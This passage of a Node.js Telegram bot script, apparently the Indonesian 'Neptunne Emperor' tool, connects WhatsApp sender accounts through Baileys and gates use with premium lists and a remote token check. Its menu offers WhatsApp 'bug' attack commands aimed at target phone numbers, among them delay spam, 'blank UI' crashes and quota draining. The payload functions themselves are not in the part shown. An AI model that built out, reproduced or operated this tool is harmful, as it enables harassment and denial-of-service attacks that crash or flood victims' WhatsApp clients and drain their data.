ault: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/mbapesuka/Mbpuyyy-/main/Token.json"; //Isi raw github elu

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak ada dalam database\nhubungi owner @ellsukakamuuuuu meminta akses"));
    console.log(chalk.red("YAELAH LU MAU MALING CIL"));
    console.log(chalk.red("#MISKIN AMAT YATIMM"));
    process.exit(1);
  }

  console.log(chalk.green(` # Token valid bot siap di jalankan⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.clear();
  console.log(chalk.red(`
⠀ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣛⣛⣟⢩⣍⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢟⣉⠋⠉⠻⣿⣿⣿⡿⠋⠡⠃⠋⠩⠉⠁⢈⠉  ⠈⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣦⡠⣤⣋⠉  ⣠⣦⠲⣮⡳⣦⡊⠢⡀⠂⢑⠱⡀⢙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡎⢉⠴⣀⠂⠇⢿⣧⠱⡝⢏⠈⡀⠜⣆ ⡇ ⡀⣀⢙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡘⢀⠸⢺ ⠸⣨⡛⠇ ⡌⠆⢿⣌⠈⠄⠃⡀⠐⢈ ⠾⣭⣟⡻⢿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⠃ ⠘⢰  ⡁⠐⢟⠁⠇ ⢀⠙⠦ ⡆⢸ ⠈⠢⣀⠺⠽⢿⣿⣞⡽⣻⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿ ⢠ ⢸⢰ ⠂ ⠘⡄⢨⢸⠸⠛   ⠘  ⢍⠒⠿⢒⣤⣾⣿⣿⠗⣾⣶⠽⡻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣇⣿⣿⣿⣿⡄ ⠸⠚⠰⠧ ⠰⣤⣄⠈⣀⢄⢤⣈⢂⢀   ⠈⣠⣬⣶⣝⡻⢿⡟⣸⣿⣿⣿⣾⣔⡝⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⡇⠁ ⠂ ⠰⠄⣄⣾⡟⣾⣿⣿⣿⣧⠏  ⡠⡆⡄⣿⣿⣿⣿⣿⣷⣭⡻⢿⣿⣿⣿⣿⣿⣿⣮⡻
⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⡇⠐   ⡈⢿⣿⣿⣿⣿⣿⣿⣿⣤⠖  ⡀⠁⠇⣿⣿⣿⣿⣿⣿⣿⢛⢡⣶⣶⣾⣿⣿⣿⡿⣳
⣿⣿⣿⣿⣿⣿⣿⡞⣿⣿⣿⡠ ⠐⢠⣀⢠⡸⢿⣿⣿⣯⣾⡿⡋⣴⢃⡜ ⠄⢰⣿⣟⠿⠟⣋⣤⣾⣿⣿⣿⣿⣿⣿⡿⢛⣽⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣷⣵⡄ ⠣⢆⢿⣷⣎⣽⣛⣫⣞⡉⠂⢈⡠⢀⣪⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⢟⣯⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⡀⣀⣀⡀⣁⠂⢿⣿⣿⣿⣷⣄⠚⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣭⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠩⣽⣿⣿⣿⣿⣦⣌⠛⠟⣿⣿⣿⠿⣛⣭⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣊⢯⣻⣿⣿⣿⣿⣿⣿⣿⣷⡈⠻⢿⣿⣟⢿⣿⣷⣦⣉⠩⢶⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢚⣷⣽⣿⣿⣿⣿⣿⣿⣿⠃ ⢀⠉⠻⣷⣜⢿⣿⣿⣷ ⠘⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⡟     ⠈⢻⣷⣻⣿⣏⣾⡀ ⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⡟  ⠐     ⢻⡇⡿⣼⣿⡇  ⠂⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⠟         ⠈⡇⡚⣿⣿⠂   ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠿⠿⠇           ⢹⣿⡿⠃   ⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣇⣶⣼⣾⣷⣶⣦⣤⣀⣀⣂⣀⣠⣤⣶⣤⢍  ⣀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣭⣷⣶⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡟⢰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⠟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡫⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣿⣿⣿⣿⣿⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢟⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡔⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠏⢀  ⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠇⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⣰⠇ ⠈⡈⣦⠄⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣶ ⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣏⠰⣿  ⢧⠃⢸⣿⣾⣦⣄            ⣠⣶⣾⣿⣿⠂ ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡦⣬⣤⣧⠘⣁⡈⠻⣿⣿⣿⣷⣄       ⣀⣴⣿⣿⣿⣿⣿⣿ ⡠⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⣿⣿⣿⡇⠘⣿⣆⠹⣿⣿⣿⣿⣷⡄  ⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿ ⡽⣦⡀⢈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡼⣿⣿⣷⣦⣿⣿⣄⢻⣿⣿⣿⣿⣇⢿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣯⣟⣿⣄⣓⣻⢭⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣯⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣮⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
███╗   ██╗███████╗██████╗ ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗
████╗  ██║██╔════╝██╔══██╗╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝
██╔██╗ ██║█████╗  ██████╔╝   ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  
██║╚██╗██║██╔══╝  ██╔═══╝    ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  
██║ ╚████║███████╗██║        ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗
╚═╝  ╚═══╝╚══════╝╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝

███████╗███╗   ███╗██████╗ ███████╗██████╗  ██████╗ ██████╗ 
██╔════╝████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██╔████╔██║██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝
██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗██║   ██║██╔══██╗
███████╗██║ ╚═╝ ██║██║     ███████╗██║  ██║╚██████╔╝██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ▀░
`));
console.log(chalk.blue(`✘━━━━━━━━━━━━━━━━━━━━✘
DEVELOPER : @sanzz44
BOT NAME : NEPTUNNE EMPEROR 
VERSION 1.0 
✘━━━━━━━━━━━━━━━━━━━━✘
`));
console.log(chalk.red(`YAILAH BLOM KE DETEK CILL👽`));
console.log(chalk.red(`MENDING BUY ACCESS KE @FaxzzmoDzz`));
console.log(chalk.yellow(`TAPI BOONGGGGGGGG`));
console.log(chalk.green(`BOT BERHASIL TERHUBUNG..`));
};
validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.red(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.yellow(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.blue(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
 ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ :  ${botNumber}.....
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\` ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ : ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴘᴀɪʀɪɴɢ\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\` ᴘᴀɪʀɪɴɢ sᴜᴄᴄᴇs ɴᴏᴍᴏʀ ${botNumber}\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "ONDEONDE");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\` ᴘᴀɪʀɪɴɢ ʙᴏᴛ \`\`\`
ᴄᴏᴅᴇ ᴘᴀɪʀɪɴɢ : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴀɪʀɪɴɢ : ${botNumber}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days}d, ${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "url vidio elu. okep",
        "url. vidio elu okep",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ Bukan";
  }
}

function cekWaStatus(sock) {
  return sock?.user
    ? "✅ Terhubung"
    : "❌ Tidak Terhubung";
}

//Tamat!!

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
const bars = [
  { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 120 },
  { bar: "▰▰▱▱▱▱▱▱▱ 25%", delay: 150 },
  { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 120 },
  { bar: "▰▰▰▰▱▱▱▱▱ 55%", delay: 150 },
  { bar: "▰▰▰▰▰▱▱▱▱ 70%", delay: 120 },
  { bar: "▰▰▰▰▰▰▱▱▱ 85%", delay: 150 },
  { bar: "▰▰▰▰▰▰▰▰▱ 95%", delay: 120 },
  { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅", delay: 150 }
];

async function runProgressBar(chatId) {
  try {
    const sent = await bot.sendMessage(
      chatId,
      "⏳ Preparing menu...\n\n▱▱▱▱▱▱▱▱▱ 0%"
    );

    const msgId = sent.message_id;

    for (const step of bars) {
      await new Promise(res => setTimeout(res, step.delay));
      await bot.editMessageText(
        `⏳ Preparing menu...\n\n${step.bar}`,
        { chat_id: chatId, message_id: msgId }
      );
    }

    return msgId;
  } catch (e) {
    return null; // kalau gagal, lanjut saja
  }
}
bot.onText(/\/start|\/menu|start|menu|mbape/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  const loadingMsgId = await runProgressBar(chatId);
    if (loadingMsgId) {
      await bot.deleteMessage(chatId, loadingMsgId).catch(() => {});
    }
    
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const dragon = await bot.sendVideo(chatId, randomImage, {
    caption: `
<blockquote>⬡═—⊱𝗡𝗘𝗣𝗧𝗨𝗡𝗡𝗘 𝗘𝗠𝗣𝗘𝗥𝗢𝗥⊰—═⬡</blockquote>
<b>ᴏᴡɴᴇʀ : @sanzz44</b>
<b>version : 1.𝟢</b>
<blockquote>⬡═—⊱STATUS BOT⊰—═⬡</blockquote>
<b>sᴛᴀᴛᴜs ʙᴏᴛ : ʏᴇs</b>
<b>ᴜsᴇʀɴᴀᴍᴇ : ${username}</b>
<b>ᴜsᴇʀ ɪᴅ : ${senderId}</b>
<b>sᴛᴀᴛᴜs ᴘʀᴇᴍ : ${premiumStatus}</b>
<b>ʙᴏᴛ ʀᴜɴᴛɪᴍᴇ : ${runtime}</b>
<blockquote>⬡═—⊱SECURITY⊰—═⬡</blockquote>
<b>ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ</b>
<b>ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇ</b>
<blockquote>⧫━⟢『 THANKS 』⟣━⧫</blockquote>
`,
    parse_mode: "HTML",
    reply_to_message_id: msg.message_id,
    reply_markup: {
      inline_keyboard: [
        [
         { text: "xʙᴜɢ ᴍᴇɴᴜ", callback_data: "xbug" },
         { text: "ᴄᴏɴᴛʀᴏʟ ᴀᴄᴄᴇss", callback_data: "akses" }
         ],
         [
          { text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "tqto" },
          { text: "ᴄʜᴀɴᴇʟ ʀᴇsᴍɪ", url: "hhttps://t.me/kalszxtesti" }
         ]
        ]
    }
  });
  await bot.sendAudio(
    chatId,
    fs.createReadStream("audio/Music.mp3"),
    {
        title: "KING",
        performer: "RAMADHAN ERA"
    }
).catch(()=>{})
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const senderId = query.from.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug_show") {
  caption = `
<blockquote>⬡═—⊱ 𝗡𝗘𝗣𝗧𝗨𝗡𝗡𝗘 𝗘𝗠𝗣𝗘𝗥𝗢𝗥 ⊰—═⬡</blockquote>

<blockquote>⬡═—⊱ DELAY MENU ⊰—═⬡</blockquote>
<b>/exitusvip - 628xx [ DELAY BEBAS SPAM MURBUG]</b>
<b>/buldo - 628xx [ DELAY SPAM HARD MURBUG]</b>
<b>/xspam - 628xx [ DELAY FOR MURBUG]</b>
<b>/buldozer - 628xx [ SEDOT KUOTA ]</b>
<b>/delayinvis -628xx [ DELAY INVIS ]</b>
<b>/delayhard - 628xx [ DELAY HARD ]</b>
 <blockquote>⬡═—⊱ BLANK MENU ⊰—═⬡</blockquote>
 <b>/Blank - 628xx  [ BLANK UI ]
 <b> /delayxblank - 628xx [ BLANK X DELAY ]
<blockquote>⬡═—⊱Click Button menu⊰—═⬡</blockquote>
Silahkan Pilih Button di bawah untuk memilih menu bug
`;
    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main" }]] };
    } 
 
    if (query.data === "akses") {
      caption = `
<blockquote>⬡═—⊱ N E P T U N N E E M P E R O R ⊰—═⬡</blockquote>

<b>⌬ /addbot - Add Sender</b>
<b>⌬ /setcd - Set Cooldown</b>
<b>⌬ /addprem - Add Premium</b>
<b>⌬ /addadmin - add admin</b>
<b>⌬ /deladmin - delete admin</b>
<b>⌬ /delprem - Delete Premium</b>
<b>⌬ /tiktok - Tiktok Downloader</b>
<b>⌬ /tourl - To Url Image/Video</b>
<b>⌬ /tourl2 - To Url Image</b>

<blockquote>⬡═―—⊱ Click Button Menu ⊰―—═⬡</blockquote>
`;
    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "tqto") {
      caption = `
<blockquote>THANKS TO</blockquote>

<b>✧ -Faxzz (  Dev  )</b>

<blockquote>𝗡𝗘𝗣𝗧𝗨𝗡𝗡𝗘 𝗘𝗠𝗣𝗘𝗥𝗢𝗥</blockquote>
`;
    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = ` 
<blockquote>⬡═—⊱𝗡𝗘𝗣𝗧𝗨𝗡𝗡𝗘 𝗘𝗠𝗣𝗘𝗥𝗢𝗥⊰—═⬡</blockquote>
<b>ᴏᴡɴᴇʀ : @sanzz44Why</b>
<b>version : 𝟪.𝟢</b>
<blockquote>⬡═—⊱STATUS BOT⊰—═⬡</blockquote>
<b>sᴛᴀᴛᴜs ʙᴏᴛ : ʏᴇs</b>
<b>ᴜsᴇʀɴᴀᴍᴇ : ${username}</b>
